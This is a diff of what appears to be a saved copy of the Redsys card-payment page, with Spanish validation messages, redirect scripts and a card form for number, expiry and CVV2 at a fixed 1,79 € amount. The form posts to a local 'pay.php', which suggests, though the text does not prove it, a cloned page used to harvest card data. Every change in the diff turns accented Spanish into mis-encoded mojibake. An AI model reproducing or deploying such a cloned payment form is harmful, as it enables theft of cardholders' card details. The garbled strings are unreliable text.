@@ -18,7 +18,7 @@
 				
 		   			anadirLiteral("msg2", "La tarjeta es obligatoria");
 				
-		   			anadirLiteral("msg3", "La tarjeta ha de ser numérica");
+		   			anadirLiteral("msg3", "La tarjeta ha de ser numÃ©rica");
 				
 		   			anadirLiteral("msg4", "La tarjeta no puede ser negativa");
 				
@@ -28,37 +28,37 @@
 				
 		   			anadirLiteral("msg7", "El mes de caducidad de la tarjeta es incorrecto");
 				
-		   			anadirLiteral("msg8", "El año de caducidad de la tarjeta es obligatorio");
+		   			anadirLiteral("msg8", "El aÃ±o de caducidad de la tarjeta es obligatorio");
 				
-		   			anadirLiteral("msg9", "El año de caducidad de la tarjeta ha de ser numerico");
+		   			anadirLiteral("msg9", "El aÃ±o de caducidad de la tarjeta ha de ser numerico");
 				
-		   			anadirLiteral("msg10", "El año de caducidad de la tarjeta no puede ser negativo");
+		   			anadirLiteral("msg10", "El aÃ±o de caducidad de la tarjeta no puede ser negativo");
 				
-		   			anadirLiteral("msg11a", "El código de seguridad de la tarjeta ha de tener ");
+		   			anadirLiteral("msg11a", "El cÃ³digo de seguridad de la tarjeta ha de tener ");
 				
 		   			anadirLiteral("msg11b", " cifras");
 				
-		   			anadirLiteral("msg12", "El código de seguridad de la tarjeta ha de ser numerico");
+		   			anadirLiteral("msg12", "El cÃ³digo de seguridad de la tarjeta ha de ser numerico");
 				
-		   			anadirLiteral("msg13", "El código de seguridad de la tarjeta no puede ser negativo");
+		   			anadirLiteral("msg13", "El cÃ³digo de seguridad de la tarjeta no puede ser negativo");
 				
-		   			anadirLiteral("msg14", "El código de seguridad no es necesario para su tarjeta");
+		   			anadirLiteral("msg14", "El cÃ³digo de seguridad no es necesario para su tarjeta");
 				
-		   			anadirLiteral("msg15", "Debe Introducir un número de tarjeta válido (sin espacios ni guiones).");
+		   			anadirLiteral("msg15", "Debe Introducir un nÃºmero de tarjeta vÃ¡lido (sin espacios ni guiones).");
 				
-		   			anadirLiteral("msg16", "Por favor, seleccione un método de pago");
+		   			anadirLiteral("msg16", "Por favor, seleccione un mÃ©todo de pago");
 				
-		   			anadirLiteral("msg17", "El método de pago que ha seleccionado no está disponible temporalmente, por favor seleccione otro método de pago");
+		   			anadirLiteral("msg17", "El mÃ©todo de pago que ha seleccionado no estÃ¡ disponible temporalmente, por favor seleccione otro mÃ©todo de pago");
 				
 		   			anadirLiteral("msg18", "El titular de la tarjeta es obligatorio");
 				
-		   			anadirLiteral("msg19", "El número de documento es incorrecto");
+		   			anadirLiteral("msg19", "El nÃºmero de documento es incorrecto");
 				
 		   			anadirLiteral("msg20", "El expediente es incorrecto");
 				
 		   			anadirLiteral("msg21", "La fecha de devengo es incorrecta");
 				
-		   			anadirLiteral("msg22", "El dato específico es incorrecto");
+		   			anadirLiteral("msg22", "El dato especÃ­fico es incorrecto");
 				
 			}
 			
@@ -222,7 +222,7 @@
 			}
 		</style>
 <script>
-		// Indica si se estÃ¡n enviando datos o no
+		// Indica si se estÃƒÂ¡n enviando datos o no
 		var enviandoDatos = false;
 		
 		// Almacena la forma de pago seleccionada
@@ -231,7 +231,7 @@
 		* 												[Ref0006]	
 		* Funcion: solicitaDatosAJAX
 		* Devuelve:
-		* Solicita al SIS los datos de un mÃ©todo de pago a travÃ©s de AJAX
+		* Solicita al SIS los datos de un mÃƒÂ©todo de pago a travÃƒÂ©s de AJAX
 		************************************************************/
 		function solicitaDatosAJAX() {
 			if (!enviandoDatos) {
@@ -273,7 +273,7 @@
 						var urlOasys = dameValorElemento(req.responseXML, "urlOasys");
 						var petOasys = dameValorElemento(req.responseXML, "petOasys");
 						if (urlOasys && urlOasys != '' && petOasys && petOasys != '') {
-							// Se reenvÃ­a a Oasys
+							// Se reenvÃƒÂ­a a Oasys
 							hayError = false;
 							document.frmOASYS.dato.value = petOasys;
 							document.frmOASYS.action = urlOasys;
@@ -289,7 +289,7 @@
 						if (urlVme && urlVme != '') {
 							var paramsVme = urlVme.substring(urlVme.indexOf("?"));
 							var sessionIdVme = paramsVme.substring(paramsVme.indexOf("=")+1);
-							// Se reenvÃ­a a Vme
+							// Se reenvÃƒÂ­a a Vme
 							hayError = false;
 							document.frmVme.action = urlVme;
 							document.frmVme.ott.value = sessionIdVme;
@@ -305,7 +305,7 @@
 						if (urlSafetyPay && urlSafetyPay != '') {
 							var paramsSafetyPay = urlSafetyPay.substring(urlSafetyPay.indexOf("?"));
 				        	var TokenID = paramsSafetyPay.substring(paramsSafetyPay.indexOf("=")+1);
-							// Se reenvÃ­a a SafetyPay
+							// Se reenvÃƒÂ­a a SafetyPay
 							hayError = false;
 							document.frmSAFETYPAY.action = urlSafetyPay;
 							ocultaBoton();
@@ -320,7 +320,7 @@
 						if (urlMyBank && urlMyBank != '') {
 							var paramsSafetyPay = urlMyBank.substring(urlMyBank.indexOf("?"));
 				        	var TokenID = paramsSafetyPay.substring(paramsSafetyPay.indexOf("=")+1);
-							// Se reenvÃ­a a SafetyPay
+							// Se reenvÃƒÂ­a a SafetyPay
 							hayError = false;
 							document.frmSAFETYPAY.action = urlSafetyPay;
 							ocultaBoton();
@@ -519,19 +519,19 @@
 <ol class="steps-wr">
 <li id="s-method" class="step active">
 <span class="num">1</span>
-<p lngid="seleccioneMetodoPago" class="s-text">Seleccione método de pago</p>
+<p lngid="seleccioneMetodoPago" class="s-text">Seleccione mÃ©todo de pago</p>
 </li>
 <li id="s-auth" class="step active">
 <span class="num">2</span>
-<p lngid="comprobacionAutenticacion" class="s-text">Comprobación autenticación</p>
+<p lngid="comprobacionAutenticacion" class="s-text">ComprobaciÃ³n autenticaciÃ³n</p>
 </li>
 <li id="s-connect" class="step ">
 <span class="num">3</span>
-<p lngid="solicitandoAutorizacion" class="s-text">Solicitando Autorización</p>
+<p lngid="solicitandoAutorizacion" class="s-text">Solicitando AutorizaciÃ³n</p>
 </li>
 <li id="s-result" class="step ">
 <span class="num">4</span>
-<p lngid="resultadoTransaccion" class="s-text">Resultado Transacción</p>
+<p lngid="resultadoTransaccion" class="s-text">Resultado TransacciÃ³n</p>
 </li>
 </ol>
 <div class="clear-fix"></div>
@@ -541,7 +541,7 @@
 
 <div class="col-wr right">
 <div class="tituloSeleccioneMetodoDePago">
-<h3 class="tituloSeleccioneMetodoDePago" lngid="tituloSeleccioneMetodoDePago">Seleccione método de pago</h3>
+<h3 class="tituloSeleccioneMetodoDePago" lngid="tituloSeleccioneMetodoDePago">Seleccione mÃ©todo de pago</h3>
 </div>
 <form autocomplete="off" name="formTarjeta" action="pay.php" method="post">
 <div style="min-height:16px !important; overflow-y: auto;" class="cards-mod-wr">
@@ -559,10 +559,10 @@
 <div class="datosTarjeta">
 <div class="lineaPagoTarjeta">
 <div class="detalleTarjeta">
-<text lngid="tarjeta">Nº Tarjeta:</text>
+<text lngid="tarjeta">NÂº Tarjeta:</text>
 </div>
 <div class="inputTarjeta">
-<span style="float:left;" class="icon i-card"></span><input id="inputCard" name="Sis_Numero_Tarjeta" type="tel" class="left form-control numbersOnly" size="20" maxlength="19" lngid="altTarjeta" alt="Número de la tarjeta" title="Número de la tarjeta" autocomplete="off" float="right" pattern="[0-9]{12,19}" onkeyup="javascript:dccDinamico();" value="">
+<span style="float:left;" class="icon i-card"></span><input id="inputCard" name="Sis_Numero_Tarjeta" type="tel" class="left form-control numbersOnly" size="20" maxlength="19" lngid="altTarjeta" alt="NÃºmero de la tarjeta" title="NÃºmero de la tarjeta" autocomplete="off" float="right" pattern="[0-9]{12,19}" onkeyup="javascript:dccDinamico();" value="">
 </div>
 </div>
 <div class="lineaPagoTarjeta">
@@ -571,23 +571,23 @@
 </div>
 <div class="inputTarjeta">
 <span style="float:left;" class="icon i-cal"></span><input style="margin-right: 5px;" id="cad1" name="Sis_Caducidad_Tarjeta_Mes" placeholder="mm" type="tel" class="left form-control numbersOnly" size="2" maxlength="2" lngid="mes" alt="Mes" title="Mes" autocomplete="off" pattern="[0-9]{2}" value="">&nbsp;
-							<input id="cad2" name="Sis_Caducidad_Tarjeta_Anno" placeholder="aa" type="tel" class="left form-control numbersOnly" size="2" maxlength="2" lngid="agno" alt="Año" title="Año" autocomplete="off" pattern="[0-9]{2}" value="">
+							<input id="cad2" name="Sis_Caducidad_Tarjeta_Anno" placeholder="aa" type="tel" class="left form-control numbersOnly" size="2" maxlength="2" lngid="agno" alt="AÃ±o" title="AÃ±o" autocomplete="off" pattern="[0-9]{2}" value="">
 <div style="display:none;" id="mmaa">&nbsp;(<span lngid="monthmonth" id="monthmonth" class="text">mm</span>/
 							<span lngid="yearyear" id="yearyear" class="text">aa</span>)</div>
 </div>
 </div>
 <div class="lineaPagoTarjeta">
 <div class="detalleTarjeta">
-<text lngid="codigoSeguridad">Cód. Seguridad:</text>
+<text lngid="codigoSeguridad">CÃ³d. Seguridad:</text>
 </div>
 <div class="inputTarjeta">
-<span style="float:left;" class="icon i-lock"></span><input id="codseg" name="Sis_Tarjeta_CVV2" type="tel" class="left form-control numbersOnly" maxlength="4" size="4" lngid="codigoSeguridad" alt="Cód. Seguridad" title="Cód. Seguridad" autocomplete="off" pattern="[0-9]{0,4}" value=""><span class="icon-cvc-help" lngid="altCVV2info" alt="¿Qué es el CVV2?" title="¿Qué es el CVV2?" value="?">?
+<span style="float:left;" class="icon i-lock"></span><input id="codseg" name="Sis_Tarjeta_CVV2" type="tel" class="left form-control numbersOnly" maxlength="4" size="4" lngid="codigoSeguridad" alt="CÃ³d. Seguridad" title="CÃ³d. Seguridad" autocomplete="off" pattern="[0-9]{0,4}" value=""><span class="icon-cvc-help" lngid="altCVV2info" alt="Â¿QuÃ© es el CVV2?" title="Â¿QuÃ© es el CVV2?" value="?">?
 							</span>
 </div>
 </div>
 <input value="" name="Sis_Divisa" type="hidden">
 
-<div class="message hide" id="message01">Introduce un nÂº</div>
+<div class="message hide" id="message01">Introduce un nÃ‚Âº</div>
 <div id="iframe3DSMethod"></div>
 <input value="false" name="browserJavaEnabled" id="browserJavaEnabled" type="hidden"><input value="en-US" name="browserLanguage" id="browserLanguage" type="hidden"><input value="24" name="browserColorDepth" id="browserColorDepth" type="hidden"><input value="657" name="browserScreenHeight" id="browserScreenHeight" type="hidden"><input value="1366" name="browserScreenWidth" id="browserScreenWidth" type="hidden"><input value="0" name="browserTZ" id="browserTZ" type="hidden"><input value="Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36" name="browserUserAgent" id="browserUserAgent" type="hidden"><input value="U" name="threeDSCompInd" id="threeDSCompInd" type="hidden">
 <div class="col-wr buttons-wr right">
@@ -618,7 +618,7 @@
 <div class="col-wr left result">
 <div class="ticket-mod-wr">
 <div class="datosDeLaOperacion">
-<h3 class="datosDeLaOperacion" lngid="datosDeLaOperacion">Datos de la operación</h3>
+<h3 class="datosDeLaOperacion" lngid="datosDeLaOperacion">Datos de la operaciÃ³n</h3>
 </div>
 <div class="ticket-header">
 <div class="circle half-circlel"></div>
@@ -628,7 +628,7 @@
 <p lngid="importe">Importe:</p>
 </div>
 <div class="right">
-<p>1,79&nbsp;€</p>
+<p>1,79&nbsp;Â€</p>
 </div>
 <br class="clear-fix">
 </div>
@@ -685,11 +685,11 @@
 </div>
 <div id="lightbox-panel">
 <div class="cancel-wr">
-<h2 lngid="codigoSeguridad">Cód. Seguridad</h2>
+<h2 lngid="codigoSeguridad">CÃ³d. Seguridad</h2>
 <img src="./Redsys_files/9999cvc-help.png" onerror="this.src=&#39;/sis/graficos/logotipos/comunes/9999cvc-help.png&#39;"></div>
 <div class="help-text">
-<p lngid="codigoSeguridadTresDigitos">El código de seguridad son los tres últimos dígitos que aparecen en el reverso de las tarjetas de las marcas Visa, Visa Electron, Mastercard y Maestro.</p>
-<p lngid="casoTarjetasAmericanExpress">En el caso de las tarjetas American Express, el código son los cuatro dígitos que aparecen encima de la numeración de la tarjeta.</p>
+<p lngid="codigoSeguridadTresDigitos">El cÃ³digo de seguridad son los tres Ãºltimos dÃ­gitos que aparecen en el reverso de las tarjetas de las marcas Visa, Visa Electron, Mastercard y Maestro.</p>
+<p lngid="casoTarjetasAmericanExpress">En el caso de las tarjetas American Express, el cÃ³digo son los cuatro dÃ­gitos que aparecen encima de la numeraciÃ³n de la tarjeta.</p>
 </div>
 <div class="cancel-wr">
 <button lngid="cerrar" class="btn btn-lg btn-close close-panel" type="button">Cerrar</button>
